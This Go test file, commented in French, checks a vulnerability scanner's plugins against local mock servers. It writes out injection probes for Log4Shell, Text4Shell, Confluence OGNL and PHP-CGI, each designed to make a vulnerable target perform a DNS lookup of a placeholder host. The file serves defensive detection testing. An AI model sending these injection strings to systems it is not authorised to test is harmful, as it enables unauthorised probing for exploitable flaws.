package plugin

// Tests de non-régression des checkers migrés en plugins officiels : mêmes cibles simulées et
// mêmes verdicts que les anciens checkers compilés en Go.

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"

	"github.com/Eizi0/OpenCVEC/internal/checks"
)

func official(t *testing.T, file string) *Checker {
	t.Helper()
	b, err := os.ReadFile("../../plugins/" + file)
	if err != nil {
		t.Fatal(err)
	}
	p, err := Parse(b)
	if err != nil {
		t.Fatalf("%s : %v", file, err)
	}
	return &Checker{P: p, Publisher: OfficialName, Signed: true}
}

type seen struct {
	mu    sync.Mutex
	hosts []string
}

func (s *seen) add(h string) { s.mu.Lock(); s.hosts = append(s.hosts, h); s.mu.Unlock() }
func (s *seen) has(sub string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, h := range s.hosts {
		if strings.Contains(h, sub) {
			return true
		}
	}
	return false
}

func inputs(r *http.Request) []string {
	_ = r.ParseForm()
	var v []string
	for _, x := range r.Header {
		v = append(v, x...)
	}
	for _, x := range r.Form {
		v = append(v, x...)
	}
	return v
}

func TestLog4ShellPluginInjectsEveryPoint(t *testing.T) {
	rec := &seen{}
	re := regexp.MustCompile(`\$\{jndi:ldap://([^/}]+)/a\}`)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		for _, v := range inputs(r) {
			if m := re.FindStringSubmatch(v); m != nil {
				rec.add(m[1])
			}
		}
	}))
	defer srv.Close()
	out, err := official(t, "log4shell.yaml").Run(context.Background(), srv.URL+"/solr/admin/cores", loopbackEnv())
	if err != nil || out.Verdict != "" {
		t.Fatalf("%q %v", out.Verdict, err)
	}
	labels := map[string]string{}
	for _, p := range out.Points {
		labels[p.ID] = p.Location
	}
	for i := 1; i <= 12; i++ {
		id := "p" + itoa(i)
		if !rec.has(id + ".abcdefghijklmnopqrst.c.test") {
			t.Errorf("point %s (%s) non reçu par la cible", id, labels[id])
		}
		if labels[id] == "" {
			t.Errorf("point %s sans libellé", id)
		}
	}
	if labels["p2"] != "en-tête X-Api-Version" {
		t.Fatalf("libellé p2 : %q", labels["p2"])
	}
}

func itoa(i int) string { return strconv.Itoa(i) }

func TestText4ShellPlugin(t *testing.T) {
	rec := &seen{}
	re := regexp.MustCompile(`\$\{dns:address\|([^}]+)\}`)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		for _, v := range inputs(r) {
			if m := re.FindStringSubmatch(v); m != nil {
				rec.add(m[1])
			}
		}
	}))
	defer srv.Close()
	if _, err := official(t, "text4shell.yaml").Run(context.Background(), srv.URL+"/text4shell/attack", loopbackEnv()); err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{"p1.", "p2.", "p6.", "p7.", "p8."} {
		if !rec.has(p + "abcdefghijklmnopqrst") {
			t.Errorf("%s non reçu : %v", p, rec.hosts)
		}
	}
}

func TestConfluencePluginPath(t *testing.T) {
	var got string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { got = r.URL.Path }))
	defer srv.Close()
	if _, err := official(t, "confluence-ognl.yaml").Run(context.Background(), srv.URL+"/wiki/", loopbackEnv()); err != nil {
		t.Fatal(err)
	}
	want := `/wiki/${(#a=@java.net.InetAddress@getByName("p1.abcdefghijklmnopqrst.c.test"))}/`
	if got != want {
		t.Fatalf("chemin reçu %q, attendu %q", got, want)
	}
}

func TestPHPCGIPluginIsDNSOnly(t *testing.T) {
	var mu sync.Mutex
	var reqs, bodies []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		reqs = append(reqs, r.URL.Path+"?"+r.URL.RawQuery)
		bodies = append(bodies, string(b))
		mu.Unlock()
	}))
	defer srv.Close()
	if _, err := official(t, "php-cgi-4577.yaml").Run(context.Background(), srv.URL+"/app/page.php", loopbackEnv()); err != nil {
		t.Fatal(err)
	}
	wantPaths := []string{"/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1", "/index.php?%ADd", "/app/page.php?%ADd"}
	if len(reqs) != 3 {
		t.Fatalf("requêtes : %v", reqs)
	}
	for i, w := range wantPaths {
		if !strings.HasPrefix(reqs[i], w) {
			t.Errorf("requête %d = %q", i, reqs[i])
		}
		if bodies[i] != "<?php gethostbyname('p"+string(rune('1'+i))+".abcdefghijklmnopqrst.c.test'); ?>" {
			t.Errorf("corps %d = %q", i, bodies[i])
		}
	}
}

func headerServer(h, v string) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Header().Set(h, v) }))
}

func TestPHP2ShellPluginVersions(t *testing.T) {
	c := official(t, "php2shell.yaml")
	cases := map[string]string{
		"PHP/8.3.35": checks.VerdictProbable, "PHP/8.3.36": checks.VerdictPatched, "PHP/8.3.40": checks.VerdictPatched,
		"PHP/8.2.34": checks.VerdictProbable, "PHP/8.4.27": checks.VerdictPatched, "PHP/8.5.11": checks.VerdictProbable,
		"PHP/8.1.31": checks.VerdictProbable, "PHP/7.4.33": checks.VerdictProbable, "PHP/5.3.29": checks.VerdictInconclusive,
		"PHP/8.6.0": checks.VerdictInconclusive, "PHP/8.3": checks.VerdictProbable,
	}
	for v, want := range cases {
		srv := headerServer("X-Powered-By", v)
		out, err := c.Run(context.Background(), srv.URL, loopbackEnv())
		srv.Close()
		if err != nil || out.Verdict != want {
			t.Errorf("%s : %q (attendu %q) %s", v, out.Verdict, want, out.Summary)
		}
	}
	srv := headerServer("Server", "Apache/2.4.62 (Debian) PHP/8.4.20")
	out, _ := c.Run(context.Background(), srv.URL, loopbackEnv())
	srv.Close()
	if out.Verdict != checks.VerdictProbable {
		t.Errorf("version lue dans Server : %q", out.Verdict)
	}
	srv = headerServer("X-Other", "x")
	out, _ = c.Run(context.Background(), srv.URL, loopbackEnv())
	srv.Close()
	if out.Verdict != checks.VerdictInconclusive || !strings.Contains(out.Summary, "n'annonce pas") {
		t.Errorf("sans version : %q %s", out.Verdict, out.Summary)
	}
}

func wpServer(home, feed string, feedHits *int) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/feed/" {
			*feedHits++
			io.WriteString(w, feed)
			return
		}
		io.WriteString(w, home)
	}))
}

func TestWP2ShellPlugin(t *testing.T) {
	c := official(t, "wp2shell.yaml")
	for v, want := range map[string]string{
		"6.9.4": checks.VerdictProbable, "6.9.5": checks.VerdictPatched, "7.0.1": checks.VerdictProbable, "7.0.2": checks.VerdictPatched,
		"6.8.5": checks.VerdictProbable, "6.8.6": checks.VerdictPatched, "6.7.2": checks.VerdictInconclusive, "7.1": checks.VerdictPatched,
	} {
		hits := 0
		srv := wpServer(`<meta name="generator" content="WordPress `+v+`" />`, "", &hits)
		out, err := c.Run(context.Background(), srv.URL+"/", loopbackEnv())
		srv.Close()
		if err != nil || out.Verdict != want {
			t.Errorf("WordPress %s : %q (attendu %q)", v, out.Verdict, want)
		}
		if hits != 0 {
			t.Errorf("WordPress %s : /feed/ ne doit pas être demandé quand la balise suffit", v)
		}
	}
	hits := 0
	srv := wpServer(`<link href="/wp-content/x.css">`, "<rss><generator>https://wordpress.org/?v=7.0.1</generator></rss>", &hits)
	out, _ := c.Run(context.Background(), srv.URL+"/", loopbackEnv())
	srv.Close()
	if out.Verdict != checks.VerdictProbable || hits != 1 {
		t.Errorf("repli sur le flux RSS : %q, %d requête(s) /feed/", out.Verdict, hits)
	}
	srv = wpServer(`<link href="/wp-content/x.css">`, "rien", &hits)
	out, _ = c.Run(context.Background(), srv.URL+"/", loopbackEnv())
	srv.Close()
	if out.Verdict != checks.VerdictInconclusive || !strings.Contains(out.Summary, "masquée") {
		t.Errorf("WordPress masqué : %q %s", out.Verdict, out.Summary)
	}
	srv = wpServer("bonjour", "rien", &hits)
	out, _ = c.Run(context.Background(), srv.URL+"/", loopbackEnv())
	srv.Close()
	if out.Verdict != checks.VerdictInconclusive || !strings.Contains(out.Summary, "non détecté") {
		t.Errorf("pas de WordPress : %q %s", out.Verdict, out.Summary)
	}
}

func TestFortiBleedPlugin(t *testing.T) {
	c := official(t, "fortibleed.yaml")
	vpnOnly := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/remote/login" {
			http.SetCookie(w, &http.Cookie{Name: "SVPNTMPCOOKIE", Value: "x"})
			io.WriteString(w, `<script src="/remote/fgt_lang?lang=en"></script>`)
			return
		}
		http.NotFound(w, r)
	}))
	defer vpnOnly.Close()
	out, err := c.Run(context.Background(), vpnOnly.URL+"/whatever", loopbackEnv())
	if err != nil || out.Verdict != checks.VerdictExposed || !strings.Contains(out.Summary, "SSL-VPN") || strings.Contains(out.Summary, "administration") {
		t.Fatalf("VPN seul : %+v %v", out, err)
	}
	both := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Server", "xxxxxxxx-xxxxx")
		io.WriteString(w, "login")
	}))
	defer both.Close()
	out, _ = c.Run(context.Background(), both.URL, loopbackEnv())
	if out.Verdict != checks.VerdictExposed || !strings.Contains(out.Summary, "administration et portail SSL-VPN") {
		t.Fatalf("deux interfaces : %+v", out)
	}
	plain := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, "hello") }))
	defer plain.Close()
	out, _ = c.Run(context.Background(), plain.URL, loopbackEnv())
	if out.Verdict != checks.VerdictInconclusive || !strings.Contains(out.Summary, "Aucune interface FortiGate") {
		t.Fatalf("serveur ordinaire : %+v", out)
	}
	if _, err := c.Run(context.Background(), "http://127.0.0.1:1/", loopbackEnv()); err == nil {
		t.Fatal("une cible injoignable doit donner une erreur")
	}
}
